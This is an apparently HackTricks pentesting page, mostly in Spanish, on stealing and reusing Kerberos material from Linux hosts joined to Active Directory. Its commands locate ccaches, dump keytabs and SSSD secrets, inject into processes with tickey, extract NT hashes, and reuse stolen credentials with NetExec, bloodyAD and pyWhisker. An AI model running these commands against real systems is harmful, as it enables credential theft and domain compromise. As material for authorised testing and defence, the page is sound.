# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Una máquina Linux también puede estar presente dentro de un entorno de Active Directory.

Una máquina Linux dentro de un AD también puede **almacenar material Kerberos localmente**: ccaches de usuario, keytabs de máquina/servicio y secretos gestionados por SSSD. Estos artefactos normalmente pueden reutilizarse como cualquier otra credencial Kerberos. Para leer la mayoría de ellos necesitarás ser el usuario propietario del ticket o **root** en la máquina.

## Enumeration

### AD enumeration from linux

Si tienes acceso a un AD en linux (o bash en Windows) puedes probar [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) para enumerar el AD.

También puedes revisar la siguiente página para aprender **otras formas de enumerar AD desde linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA es una **alternativa** de código abierto a Microsoft Windows **Active Directory**, principalmente para entornos **Unix**. Combina un **directorio LDAP** completo con un MIT **Kerberos** Key Distribution Center para una gestión similar a Active Directory. Utilizando el Dogtag **Certificate System** para la gestión de certificados CA y RA, admite autenticación **multifactor**, incluyendo tarjetas inteligentes. SSSD está integrado para los procesos de autenticación de Unix. Aprende más sobre ello en:


{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Antes de tocar los tickets, identifica **cómo el host fue unido a AD** y **dónde se almacena realmente el material Kerberos**. En hosts Linux modernos esto normalmente lo gestiona `realmd` + `adcli` + `sssd`, no solo archivos planos en `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Esto te dice rápidamente si el host confía en AD, si SSSD está cacheando identidades o tickets, y si **machine/service keytabs** o **KCM secrets** están disponibles para abuse.

## Playing with tickets

### Pass The Ticket

En esta página vas a encontrar distintos lugares donde podrías **encontrar kerberos tickets inside a linux host**, en la siguiente página puedes aprender cómo transformar estos formatos de tickets CCache a Kirbi (el formato que necesitas usar en Windows) y también cómo realizar un ataque PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Si quieres los flujos de trabajo de recolección de tickets específicos de Linux (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.), revisa la página dedicada:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Reutilización de tickets CCACHE desde /tmp

Los archivos CCACHE son formatos binarios para **almacenar credenciales Kerberos**. `FILE:/tmp/krb5cc_%{uid}` sigue siendo común, pero las implementaciones modernas de Linux también usan `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, o `KCM:%{uid}`. Revisa la variable de entorno **`KRB5CCNAME`** y la configuración `default_ccache_name` antes de asumir que los tickets viven en `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Reutilización de tickets CCACHE desde keyring

**Los tickets Kerberos almacenados en la memoria de un proceso pueden ser extraídos**, particularmente cuando la protección ptrace de la máquina está deshabilitada (`/proc/sys/kernel/yama/ptrace_scope`). Una herramienta útil para este propósito se encuentra en [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), que facilita la extracción al inyectarse en sesiones y volcar tickets en `/tmp`.

Para configurar y usar esta herramienta, se siguen los pasos siguientes:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Este procedimiento intentará inyectar en varias sesiones, indicando el éxito al almacenar los tickets extraídos en `/tmp` con una convención de nombres de `__krb_UID.ccache`.

### CCACHE ticket reuse from SSSD KCM

SSSD mantiene una copia de la base de datos en la ruta `/var/lib/sss/secrets/secrets.ldb`. La key correspondiente se almacena como un archivo oculto en la ruta `/var/lib/sss/secrets/.secrets.mkey`. Por defecto, la key solo es legible si tienes permisos de **root**.

Invocar **`SSSDKCMExtractor`** con los parámetros --database y --key analizará la base de datos y **decrypt the secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
El **blob de Kerberos de la credential cache puede convertirse en un archivo Kerberos CCache** usable que puede pasarse a Mimikatz/Rubeus.

### Quick keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Extraer cuentas de /etc/krb5.keytab

Las claves de cuentas de servicio, esenciales para servicios que operan con privilegios de root, se almacenan de forma segura en archivos **`/etc/krb5.keytab`**. Estas claves, similares a contraseñas para servicios, requieren una confidencialidad estricta.

Para inspeccionar el contenido del archivo keytab, se puede usar **`klist`**. En Linux, `klist -k -K -e` muestra los principals, los números de versión de clave, los tipos de cifrado y el material de la clave en bruto. Si el tipo de clave es **23 / RC4-HMAC**, el valor de la clave también es el **NT hash** de ese principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Para usuarios de Linux, **`KeyTabExtract`** ofrece la funcionalidad de extraer el hash RC4 HMAC, que se puede aprovechar para el reuse de NTLM hash. Ten en cuenta que esto solo ayuda cuando el keytab todavía contiene material **etype 23 / RC4-HMAC**. En entornos **solo AES** puede que no obtengas un NT hash reutilizable, pero aun así puedes autenticarte directamente con el keytab mediante Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
En macOS, **`bifrost`** sirve como una herramienta para el análisis de archivos keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizando la información de cuenta y hash extraída, se pueden establecer conexiones con servidores usando herramientas como **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Reuse the machine account from `/etc/krb5.keytab`

En sistemas unidos con `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` suele contener la **computer account** y uno o más **host/service principals**. Si tienes **root**, no te limites a volcarlo: usa uno de los principals listados por `klist -k` para solicitar un TGT y operar como el propio host Linux.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Esto es especialmente útil cuando el **computer object** en sí tiene derechos delegados en AD o cuando el host está autorizado para recuperar otros secretos como un **gMSA**.

### Reutilizar material Kerberos robado con herramientas AD primero en Linux

Una vez que tienes un `ccache` válido o un keytab utilizable, puedes operar contra AD **directamente desde Linux** sin convertir primero todo a formatos de Windows. Muchas herramientas modernas aceptan `KRB5CCNAME` / Kerberos auth de forma nativa:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Esto es un buen puente entre **Linux post-exploitation** y **AD object abuse**. Para las rutas de abuso a nivel de objeto en sí, consulta:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefactos de Linux gMSA / Managed Service Account

Las implementaciones recientes de Linux pueden consumir **Managed Service Accounts** directamente desde AD. En la práctica, esto significa que, después de comprometer un servidor Linux, puedes encontrar no solo el host keytab, sino también **service-specific keytabs** generados desde un gMSA. Los lugares comunes para inspeccionar son `/etc/gmsad.conf`, archivos de configuración específicos de la implementación y archivos `*.keytab` adicionales bajo `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Esto te da una identidad Kerberos reutilizable para los SPNs vinculados a esa gMSA **sin tocar ningún endpoint de Windows**. Para el abuso de gMSA/dMSA del **lado del dominio** después de obtener privilegios más altos en AD, consulta:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
